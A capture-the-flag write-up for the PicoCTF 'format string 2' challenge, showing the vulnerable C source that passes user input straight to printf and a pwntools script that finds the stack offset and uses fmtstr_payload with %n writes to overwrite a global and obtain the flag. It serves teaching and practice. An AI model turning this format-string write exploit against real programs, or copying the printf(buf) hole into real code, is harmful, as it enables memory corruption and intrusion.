# PicoCTF - format string 2

## Challenge Overview
**Title:** format string 2  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack! Download the binary here. Download the source here.

Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

## Initial Analysis
We see our input buffer and the flag buffer declared in the stack
```c
char buf[1024];
char flag[64];
```

We also find the format string **vulnerability**.
```c
scanf("%1024s", buf);
printf("Here's your input: ");
printf(buf);
```

From the description we understand that we will have to now **change** a value.  
In the code we see a global variable `sus` with the value **0x21737573**.  
```c
int sus = 0x21737573;
```

`sus` is then checked if it matches a **different** value and if so, prints the flag.

```c
if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
```

So we will have to change th value of `sus`.

## Detailed Analysis
I will use the following `pwntools` Python script to create the string **payload**.

### Script
```python
from pwn import *

exe = context.binary = ELF('./vuln', checksec=False)

target_addr = exe.symbols.sus
value_to_write = 0x67616c66

conn = remote('rhea.picoctf.net', 62587)

# Calculate argument offset
def find_offset():
   payload=b"AAAA"
   payload += b'%p.' * 20  # print 20 pointers from stack
   print(conn.recvline())
   conn.sendline(payload)
   print(conn.recvline())

def send_payload():
   
   offset = 14

   payload = fmtstr_payload(offset, {target_addr: value_to_write},write_size='byte')
   print(payload)

   print(conn.recvline())
   conn.sendline(payload)
   print(conn.recvall())
   

send_payload()
# find_offset()
```

First, I call `find_offset()` to find the **start** of the input which is needed for correct **argument** offset and I see the following.  
```
Here's your input: AAAA0x402075.(nil).0x733f4236ba00.(nil).0x15332b0.0x733f423bdaf0.0x733f423944e8.0x9.0x733f42394de9.0x733f42165098.0x733f423814d0.(nil).0x7ffdc76d9cd0.0x252e702541414141.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.\n"
```

We see that the start of our **input**, A (0x41), appears at offset **14**.

We replace that value in the `offset` variable of `send_payload()`.  
`send_payload()` constructs the string **payload** and sends it to the server.

Now running our script and calling `send_payload()` we see
```
I have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{___REDACTED___}
```

### String Format Background
To **write** values using formatted strings, we use the **%<num>$n** format specifier which **writes** the amount of currently outputted **bytes** to the stack argument at the **specified** offset, thats why we **need** to find the offset.  
We write **1 byte** at a time, specified by **hh**, to prevent side effects, like **overwriting** further than we intended.

## Solution
- Use the above **script**
- Change the server name and port number accordingly.
- Run

## Tools Used
- `pwntools`